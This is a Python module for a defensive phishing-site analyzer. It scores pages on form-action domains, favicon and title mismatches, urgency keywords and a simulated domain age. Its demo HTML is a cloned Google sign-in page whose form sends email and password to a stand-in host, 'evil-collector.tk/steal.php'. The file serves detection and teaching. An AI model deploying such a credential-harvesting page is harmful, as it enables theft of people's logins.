"""
Website Analyzer Module
=======================
Detects fake/cloned phishing websites through content and structural analysis.

Detection Techniques:
- Login form analysis (action URLs, hidden fields)
- External resource origin mismatch
- Favicon domain mismatch
- Page title / domain mismatch
- SSL certificate analysis (simulated)
- Domain age checking (simulated)
- Phishing keyword detection in page content
"""

import re
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
import random
import hashlib

# Try to import BeautifulSoup, fall back to regex parsing
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# Try to import requests for live analysis
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


@dataclass
class WebsiteFinding:
    """A finding from website analysis."""
    category: str
    severity: str
    description: str
    score_impact: int
    details: Optional[str] = None


@dataclass
class LoginFormInfo:
    """Information about a login form found on the page."""
    action_url: str
    method: str
    has_password_field: bool
    has_email_field: bool
    has_hidden_fields: bool
    hidden_field_count: int
    action_domain_matches: bool


@dataclass
class WebsiteAnalysisResult:
    """Complete result of website analysis."""
    url: str
    risk_score: int
    risk_level: str
    findings: List[WebsiteFinding] = field(default_factory=list)
    login_forms: List[LoginFormInfo] = field(default_factory=list)
    page_title: Optional[str] = None
    external_resources: int = 0
    has_ssl: bool = False
    domain_age_days: Optional[int] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    @property
    def summary(self) -> str:
        return (
            f"Website Risk: {self.risk_level} ({self.risk_score}/100)\n"
            f"Login forms: {len(self.login_forms)} | "
            f"Findings: {len(self.findings)}\n"
            f"Domain age: {self.domain_age_days or 'Unknown'} days"
        )


class WebsiteAnalyzer:
    """
    Analyzes websites for phishing indicators.

    Performs structural and content analysis on web pages to detect
    signs of phishing attacks, including cloned login pages and
    credential harvesting forms.

    Can operate in demo mode without network access using provided HTML.

    Usage:
        analyzer = WebsiteAnalyzer()
        # Analyze raw HTML
        result = analyzer.analyze_website(html_content=sample_html, url="http://example.com")
        # Analyze with URL (requires requests)
        result = analyzer.analyze_website(url="http://suspicious-site.com")
    """

    # Phishing-related keywords to look for in page content
    PHISHING_KEYWORDS = [
        "verify your account", "confirm your identity", "update your information",
        "suspended", "unauthorized access", "unusual activity",
        "confirm your password", "verify your email", "login to continue",
        "your account has been", "click here to restore",
        "account will be closed", "verify within 24 hours",
        "security alert", "action required immediately",
    ]

    # Known brands for title/domain matching
    BRAND_KEYWORDS = {
        "google": ["gmail", "google", "g suite"],
        "microsoft": ["microsoft", "outlook", "office 365", "onedrive"],
        "apple": ["apple", "icloud", "apple id"],
        "paypal": ["paypal"],
        "amazon": ["amazon", "aws"],
        "facebook": ["facebook", "meta"],
        "netflix": ["netflix"],
        "linkedin": ["linkedin"],
    }

    def __init__(self):
        pass

    def analyze_website(self, url: str = "", html_content: str = "") -> WebsiteAnalysisResult:
        """
        Analyze a website for phishing indicators.

        Args:
            url: URL of the website (used for context and optional fetching)
            html_content: Raw HTML content to analyze (if not fetching)

        Returns:
            WebsiteAnalysisResult with risk assessment
        """
        findings: List[WebsiteFinding] = []

        # If no HTML provided, try to fetch (or use demo content)
        if not html_content:
            if url and HAS_REQUESTS:
                try:
                    resp = requests.get(url, timeout=10, verify=False)
                    html_content = resp.text
                except Exception as e:
                    findings.append(WebsiteFinding(
                        "fetch_error", "LOW",
                        f"Could not fetch website: {e}", 5
                    ))
                    html_content = ""
            elif not url:
                html_content = self._get_demo_html()

        # Parse domain from URL
        domain = ""
        if url:
            from urllib.parse import urlparse
            parsed = urlparse(url if url.startswith("http") else "http://" + url)
            domain = parsed.netloc.lower()
            if ':' in domain:
                domain = domain.split(':')[0]

        # Run all checks
        if html_content:
            findings.extend(self._check_page_content(html_content))
            login_forms = self._extract_login_forms(html_content, domain)
            findings.extend(self._check_form_actions(html_content, domain))
            findings.extend(self._check_external_resources(html_content, domain))
            findings.extend(self._check_favicon_mismatch(html_content, domain))
            findings.extend(self._check_page_title_mismatch(html_content, domain))
        else:
            login_forms = []

        # Domain-based checks
        cert_findings = self._check_certificate_info(url)
        findings.extend(cert_findings)

        domain_age = self._check_domain_age(domain)
        findings.extend(domain_age["findings"])

        has_ssl = url.startswith("https://") if url else False

        # Extract page title
        page_title = self._extract_title(html_content) if html_content else None

        # Calculate score
        raw_score = sum(f.score_impact for f in findings)
        risk_score = min(100, raw_score)
        risk_level = self._score_to_level(risk_score)

        return WebsiteAnalysisResult(
            url=url,
            risk_score=risk_score,
            risk_level=risk_level,
            findings=findings,
            login_forms=login_forms,
            page_title=page_title,
            has_ssl=has_ssl,
            domain_age_days=domain_age.get("age_days"),
        )

    def _check_page_content(self, html: str) -> List[WebsiteFinding]:
        """
        Analyze page content for phishing indicators.

        Looks for urgency language, credential requests, and social
        engineering phrases commonly found on phishing pages.
        """
        findings = []
        text = self._html_to_text(html).lower()

        # Check for phishing keywords
        found_keywords = []
        for keyword in self.PHISHING_KEYWORDS:
            if keyword.lower() in text:
                found_keywords.append(keyword)

        if len(found_keywords) >= 3:
            findings.append(WebsiteFinding(
                "phishing_content", "HIGH",
                f"Multiple phishing keywords detected ({len(found_keywords)})",
                20,
                f"Keywords found: {', '.join(found_keywords[:5])}"
            ))
        elif len(found_keywords) >= 1:
            findings.append(WebsiteFinding(
                "phishing_content", "MEDIUM",
                f"Phishing keyword(s) detected: {', '.join(found_keywords[:3])}",
                10
            ))

        # Check for password/credential fields in non-login contexts
        if "password" in text and "credit card" in text:
            findings.append(WebsiteFinding(
                "credential_harvesting", "CRITICAL",
                "Page requests both password and credit card information",
                30,
                "Legitimate sites rarely request both on the same page."
            ))

        # Check for right-click/copy prevention (common in phishing)
        if "event.preventDefault" in html and "contextmenu" in html:
            findings.append(WebsiteFinding(
                "anti_analysis", "MEDIUM",
                "Page disables right-click (anti-analysis technique)",
                10,
                "Phishing pages often prevent right-clicking to stop "
                "users from inspecting the page."
            ))

        return findings

    def _check_form_actions(self, html: str, domain: str) -> List[WebsiteFinding]:
        """
        Check where forms submit data to.

        Security Concept:
            Phishing forms often submit credentials to a different domain
            than the one displayed, or use suspicious endpoints.
        """
        findings = []
        forms = self._find_forms(html)

        for form_action, method in forms:
            if not form_action or form_action == "#":
                findings.append(WebsiteFinding(
                    "form_action", "MEDIUM",
                    "Form has empty or '#' action (may submit via JavaScript)",
                    10
                ))
            elif form_action.startswith("http"):
                from urllib.parse import urlparse
                action_domain = urlparse(form_action).netloc.lower()
                if domain and action_domain and action_domain != domain:
                    findings.append(WebsiteFinding(
                        "form_action", "HIGH",
                        f"Form submits to different domain: {action_domain}",
                        25,
                        f"Page domain: {domain}, Form submits to: {action_domain}"
                    ))

        return findings

    def _check_external_resources(self, html: str, domain: str) -> List[WebsiteFinding]:
        """
        Detect mismatched resource origins.

        Phishing pages often load resources (images, CSS) from the
        legitimate site while the page itself is hosted elsewhere.
        """
        findings = []
        if not domain:
            return findings

        # Find all src and href attributes
        external_count = 0
        brand_resources = set()

        urls = re.findall(r'(?:src|href)=["\']?(https?://[^"\'>\s]+)', html, re.I)
        for url in urls:
            from urllib.parse import urlparse
            resource_domain = urlparse(url).netloc.lower()
            if resource_domain and resource_domain != domain:
                external_count += 1
                for brand, keywords in self.BRAND_KEYWORDS.items():
                    if any(kw in resource_domain for kw in keywords):
                        brand_resources.add(brand)

        if brand_resources and external_count > 3:
            findings.append(WebsiteFinding(
                "resource_mismatch", "HIGH",
                f"Page loads resources from brand domains: "
                f"{', '.join(brand_resources)}",
                20,
                f"The page at '{domain}' loads {external_count} resources "
                f"from other domains, including brand domains. This suggests "
                f"a cloned page."
            ))

        return findings

    def _check_favicon_mismatch(self, html: str, domain: str) -> List[WebsiteFinding]:
        """
        Detect favicon from a different domain.

        Phishing pages often use the legitimate site's favicon to appear
        more convincing.
        """
        findings = []
        if not domain:
            return findings

        favicon_match = re.search(
            r'<link[^>]*rel=["\'](?:shortcut )?icon["\'][^>]*href=["\']?(https?://[^"\'>\s]+)',
            html, re.I
        )

        if favicon_match:
            from urllib.parse import urlparse
            favicon_domain = urlparse(favicon_match.group(1)).netloc.lower()
            if favicon_domain and favicon_domain != domain:
                findings.append(WebsiteFinding(
                    "favicon_mismatch", "HIGH",
                    f"Favicon loaded from different domain: {favicon_domain}",
                    15,
                    "Using another site's favicon is a strong indicator of "
                    "a cloned phishing page."
                ))

        return findings

    def _check_page_title_mismatch(self, html: str, domain: str) -> List[WebsiteFinding]:
        """
        Check if page title doesn't match the domain.

        A page on 'evil.com' with the title 'Google Sign-In' is suspicious.
        """
        findings = []
        if not domain:
            return findings

        title = self._extract_title(html)
        if not title:
            return findings

        title_lower = title.lower()
        for brand, keywords in self.BRAND_KEYWORDS.items():
            brand_in_title = any(kw in title_lower for kw in keywords)
            brand_in_domain = any(kw in domain for kw in keywords)

            if brand_in_title and not brand_in_domain:
                findings.append(WebsiteFinding(
                    "title_mismatch", "HIGH",
                    f"Page title references '{brand}' but domain is '{domain}'",
                    20,
                    f"Title: '{title}' - Domain mismatch with brand name."
                ))
                break

        return findings

    def _extract_login_forms(self, html: str, domain: str = "") -> List[LoginFormInfo]:
        """
        Find and analyze login forms on the page.

        Extracts information about forms that contain password fields,
        which are likely login/credential forms.
        """
        forms = []

        if HAS_BS4:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                has_password = bool(form.find('input', {'type': 'password'}))
                has_email = bool(form.find('input', {'type': re.compile(r'email|text')}))
                hidden_fields = form.find_all('input', {'type': 'hidden'})
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()

                if has_password or has_email:
                    action_matches = True
                    if action and action.startswith('http') and domain:
                        from urllib.parse import urlparse
                        action_matches = domain in urlparse(action).netloc

                    forms.append(LoginFormInfo(
                        action_url=action,
                        method=method,
                        has_password_field=has_password,
                        has_email_field=has_email,
                        has_hidden_fields=len(hidden_fields) > 0,
                        hidden_field_count=len(hidden_fields),
                        action_domain_matches=action_matches,
                    ))
        else:
            # Regex fallback
            form_blocks = re.findall(r'<form[^>]*>(.*?)</form>', html, re.S | re.I)
            for form_match in re.finditer(r'<form([^>]*)>', html, re.I):
                attrs = form_match.group(1)
                action = re.search(r'action=["\']?([^"\'>\s]*)', attrs, re.I)
                method = re.search(r'method=["\']?([^"\'>\s]*)', attrs, re.I)
                action = action.group(1) if action else ""
                method = (method.group(1) if method else "GET").upper()

                # Look ahead for inputs
                start = form_match.end()
                end_match = re.search(r'</form>', html[start:], re.I)
                form_html = html[start:start + end_match.start()] if end_match else ""

                has_password = bool(re.search(r'type=["\']?password', form_html, re.I))
                has_email = bool(re.search(r'type=["\']?(email|text)', form_html, re.I))
                hidden_count = len(re.findall(r'type=["\']?hidden', form_html, re.I))

                if has_password or has_email:
                    forms.append(LoginFormInfo(
                        action_url=action,
                        method=method,
                        has_password_field=has_password,
                        has_email_field=has_email,
                        has_hidden_fields=hidden_count > 0,
                        hidden_field_count=hidden_count,
                        action_domain_matches=True,
                    ))

        return forms

    def _check_certificate_info(self, url: str) -> List[WebsiteFinding]:
        """
        Analyze SSL certificate (simulated for demo purposes).

        In production, this would verify the certificate chain, check
        for self-signed certs, and validate the CN/SAN fields.
        """
        findings = []
        if not url:
            return findings

        if not url.startswith("https://"):
            findings.append(WebsiteFinding(
                "certificate", "MEDIUM",
                "Website does not use HTTPS",
                10,
                "Login pages should always use HTTPS encryption."
            ))

        return findings

    def _check_domain_age(self, domain: str) -> Dict:
        """
        Check domain age (simulated for demo).

        Security Concept:
            Phishing domains are typically very new (registered hours or
            days before the attack). Legitimate services have domains
            registered for years.

        In production, this would query WHOIS data.
        """
        result = {"findings": [], "age_days": None}
        if not domain:
            return result

        # Simulate domain age using hash for consistency
        domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
        # Known legitimate domains get old ages
        well_known = ["google.com", "microsoft.com", "apple.com",
                       "amazon.com", "facebook.com", "github.com"]

        if domain in well_known:
            age_days = 5000 + (domain_hash % 3000)
        else:
            age_days = domain_hash % 1000

        result["age_days"] = age_days

        if age_days < 30:
            result["findings"].append(WebsiteFinding(
                "domain_age", "HIGH",
                f"Domain is very new ({age_days} days old)",
                20,
                "Phishing domains are typically registered just before attacks."
            ))
        elif age_days < 90:
            result["findings"].append(WebsiteFinding(
                "domain_age", "MEDIUM",
                f"Domain is relatively new ({age_days} days old)",
                10,
            ))

        return result

    # -------------------------------------------------------------------------
    # Utility methods
    # -------------------------------------------------------------------------

    def _extract_title(self, html: str) -> Optional[str]:
        """Extract page title from HTML."""
        if HAS_BS4:
            soup = BeautifulSoup(html, 'html.parser')
            title_tag = soup.find('title')
            return title_tag.string if title_tag else None
        else:
            match = re.search(r'<title[^>]*>(.*?)</title>', html, re.I | re.S)
            return match.group(1).strip() if match else None

    def _html_to_text(self, html: str) -> str:
        """Convert HTML to plain text."""
        if HAS_BS4:
            soup = BeautifulSoup(html, 'html.parser')
            return soup.get_text()
        else:
            text = re.sub(r'<[^>]+>', ' ', html)
            text = re.sub(r'\s+', ' ', text)
            return text.strip()

    def _find_forms(self, html: str) -> List[Tuple[str, str]]:
        """Find all forms and return (action, method) pairs."""
        forms = []
        if HAS_BS4:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                forms.append((action, method))
        else:
            for match in re.finditer(r'<form([^>]*)>', html, re.I):
                attrs = match.group(1)
                action_m = re.search(r'action=["\']?([^"\'>\s]*)', attrs, re.I)
                method_m = re.search(r'method=["\']?([^"\'>\s]*)', attrs, re.I)
                action = action_m.group(1) if action_m else ""
                method = (method_m.group(1) if method_m else "GET").upper()
                forms.append((action, method))
        return forms

    def _get_demo_html(self) -> str:
        """Return sample HTML for demo mode."""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Google Sign-In</title>
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico">
</head>
<body>
    <div class="login-container">
        <h1>Sign in to your Google Account</h1>
        <p>Verify your account to continue. Unusual activity was detected.</p>
        <form action="http://evil-collector.tk/steal.php" method="POST">
            <input type="hidden" name="token" value="abc123">
            <input type="hidden" name="redirect" value="google.com">
            <input type="email" name="email" placeholder="Email">
            <input type="password" name="password" placeholder="Password">
            <input type="text" name="phone" placeholder="Phone number">
            <button type="submit">Sign In</button>
        </form>
        <p class="warning">Your account will be closed if not verified within 24 hours.</p>
    </div>
</body>
</html>"""

    @staticmethod
    def _score_to_level(score: int) -> str:
        """Convert numeric score to risk level."""
        if score <= 10:
            return "SAFE"
        elif score <= 25:
            return "LOW"
        elif score <= 50:
            return "MEDIUM"
        elif score <= 75:
            return "HIGH"
        else:
            return "CRITICAL"
